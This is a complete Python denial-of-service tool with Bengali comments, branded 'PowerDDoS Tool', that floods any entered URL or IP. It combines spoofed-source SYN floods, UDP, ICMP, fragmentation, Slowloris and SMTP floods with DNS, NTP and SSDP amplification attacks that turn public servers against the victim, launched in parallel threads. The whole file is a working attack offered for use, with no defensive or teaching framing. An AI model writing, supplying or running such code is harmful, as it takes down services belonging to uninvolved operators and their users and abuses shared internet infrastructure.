import socket
import random
import threading
import time
import os
import requests
from scapy.all import *
from colorama import Fore, init
import urllib3

# HTTPS ওয়ার্নিং বন্ধ করা
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Colorama ইনিশিয়ালাইজ
init()

# রঙের জন্য ভেরিয়েবল
GREEN = Fore.GREEN
RED = Fore.RED
WHITE = Fore.WHITE
RESET = Fore.RESET

# প্রক্সি লিস্ট (উদাহরণ)
proxies_list = [
    "http://10.10.1.10:3128",
    "http://45.32.123.45:80",
    # বাস্তবে ফ্রি প্রক্সি লিস্ট যোগ করুন
]

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    print(f"""
{GREEN}        ╔════════════════════════════════════╗
        ║    PowerDDoS Tool v1.0             ║
        ║    Created by TAMIM  (xAI)           ║
        ║    Multi-Method Attack System      ║
        ╚════════════════════════════════════╝{RESET}
    """)

# 1. TCP SYN Flood
def syn_flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
            packet = IP(src=src_ip, dst=target_ip) / TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
            send(packet, verbose=0)
            print(f"{WHITE}[+] SYN Flood sent to {target_ip}:{target_port}{RESET}")
        except:
            print(f"{RED}[-] SYN Flood failed{RESET}")

# 2. UDP Flood
def udp_flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < end_time:
        try:
            sock.sendto(os.urandom(1024), (target_ip, target_port))
            print(f"{WHITE}[+] UDP Flood sent to {target_ip}:{target_port}{RESET}")
        except:
            print(f"{RED}[-] UDP Flood failed{RESET}")

# 3. DNS Amplification (সীমিত উদাহরণ)
def dns_amplification(target_ip, duration):
    end_time = time.time() + duration
    dns_server = "8.8.8.8"  # উদাহরণ DNS সার্ভার
    while time.time() < end_time:
        try:
            packet = IP(dst=dns_server, src=target_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="google.com", qtype="ALL"))
            send(packet, verbose=0)
            print(f"{WHITE}[+] DNS Amplification sent to {target_ip}{RESET}")
        except:
            print(f"{RED}[-] DNS Amplification failed{RESET}")

# 4. ICMP Flood
def icmp_flood(target_ip, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            packet = IP(dst=target_ip) / ICMP()
            send(packet, verbose=0)
            print(f"{WHITE}[+] ICMP Flood sent to {target_ip}{RESET}")
        except:
            print(f"{RED}[-] ICMP Flood failed{RESET}")

# 5. NTP Amplification (সীমিত উদাহরণ)
def ntp_amplification(target_ip, duration):
    end_time = time.time() + duration
    ntp_server = "pool.ntp.org"
    while time.time() < end_time:
        try:
            packet = IP(dst=ntp_server, src=target_ip) / UDP(dport=123) / Raw(b"\x17\x00\x03\x2a" + b"\x00" * 4)
            send(packet, verbose=0)
            print(f"{WHITE}[+] NTP Amplification sent to {target_ip}{RESET}")
        except:
            print(f"{RED}[-] NTP Amplification failed{RESET}")

# 6. SSDP Amplification (সীমিত উদাহরণ)
def ssdp_amplification(target_ip, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            packet = IP(dst="239.255.255.250", src=target_ip) / UDP(dport=1900) / Raw(b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nST: ssdp:all\r\nMX: 2\r\nMAN: \"ssdp:discover\"\r\n\r\n")
            send(packet, verbose=0)
            print(f"{WHITE}[+] SSDP Amplification sent to {target_ip}{RESET}")
        except:
            print(f"{RED}[-] SSDP Amplification failed{RESET}")

# 7. IP Fragmentation
def ip_fragmentation(target_ip, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            packet = IP(dst=target_ip, flags="MF", frag=0) / Raw(os.urandom(1000))
            send(packet, verbose=0)
            print(f"{WHITE}[+] IP Fragmentation sent to {target_ip}{RESET}")
        except:
            print(f"{RED}[-] IP Fragmentation failed{RESET}")

# 8. Slowloris
def slowloris(target_ip, target_port, duration):
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n")
    while time.time() < end_time:
        try:
            sock.send(b"X-a: b\r\n")
            time.sleep(1)
            print(f"{WHITE}[+] Slowloris sent to {target_ip}:{target_port}{RESET}")
        except:
            print(f"{RED}[-] Slowloris failed{RESET}")
    sock.close()

# 9. Volumetric Attack (UDP-based)
def volumetric_attack(target_ip, target_port, duration):
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < end_time:
        try:
            sock.sendto(os.urandom(4096), (target_ip, target_port))  # বড় প্যাকেট
            print(f"{WHITE}[+] Volumetric Attack sent to {target_ip}:{target_port}{RESET}")
        except:
            print(f"{RED}[-] Volumetric Attack failed{RESET}")

# 10. Non-HTTP Application (SMTP Flood উদাহরণ)
def smtp_flood(target_ip, duration):
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, 25))
    sock.send(b"HELO test\r\n")
    while time.time() < end_time:
        try:
            sock.send(b"MAIL FROM:<test@example.com>\r\n")
            print(f"{WHITE}[+] SMTP Flood sent to {target_ip}{RESET}")
            time.sleep(0.1)
        except:
            print(f"{RED}[-] SMTP Flood failed{RESET}")
    sock.close()

def start_attack(target, attack_type="all", duration=350):
    """আক্রমণ শুরু করা"""
    clear_screen()
    banner()
    
    # URL থেকে IP বের করা
    if target.startswith("http://") or target.startswith("https://"):
        target_ip = socket.gethostbyname(target.split("://")[1].split("/")[0])
        target_port = 80 if "http://" in target else 443
    else:
        target_ip = target
        target_port = 80  # ডিফল্ট পোর্ট

    print(f"{GREEN}[*] Target IP: {target_ip}{RESET}")
    print(f"{GREEN}[*] Target Port: {target_port}{RESET}")
    print(f"{GREEN}[*] Duration: {duration} seconds{RESET}")
    print(f"{GREEN}[*] Attack Type: {attack_type}{RESET}")

    threads = []
    
    # সব ধরনের আক্রমণ চালানো
    attack_methods = {
        "syn": syn_flood,
        "udp": udp_flood,
        "dns": dns_amplification,
        "icmp": icmp_flood,
        "ntp": ntp_amplification,
        "ssdp": ssdp_amplification,
        "frag": ip_fragmentation,
        "slowloris": slowloris,
        "volumetric": volumetric_attack,
        "smtp": smtp_flood
    }

    if attack_type == "all":
        for method in attack_methods.values():
            for _ in range(5):  # প্রতিটি মেথডে ৫টি থ্রেড
                thread = threading.Thread(target=method, args=(target_ip, target_port, duration) if method not in [dns_amplification, icmp_flood, ntp_amplification, ssdp_amplification, ip_fragmentation, smtp_flood] else (target_ip, duration))
                threads.append(thread)
                thread.start()
    else:
        method = attack_methods.get(attack_type)
        if method:
            for _ in range(20):  # একটি মেথডে ২০টি থ্রেড
                thread = threading.Thread(target=method, args=(target_ip, target_port, duration) if method not in [dns_amplification, icmp_flood, ntp_amplification, ssdp_amplification, ip_fragmentation, smtp_flood] else (target_ip, duration))
                threads.append(thread)
                thread.start()

    # সব থ্রেড শেষ হওয়ার জন্য অপেক্ষা
    for thread in threads:
        thread.join()
    
    print(f"{GREEN}[*] Attack completed on {target}{RESET}")

def main():
    clear_screen()
    banner()
    
    while True:
        target = input(f"{WHITE}Enter target (URL or IP, e.g., http://example.com or 192.168.1.1): {RESET}")
        if target:
            attack_type = input(f"{WHITE}Enter attack type (all, syn, udp, dns, icmp, ntp, ssdp, frag, slowloris, volumetric, smtp) [default: all]: {RESET}").lower() or "all"
            start_attack(target, attack_type)
            break
        else:
            print(f"{RED}[-] Invalid target! Please provide a URL or IP{RESET}")

if __name__ == "__main__":
    main()
    
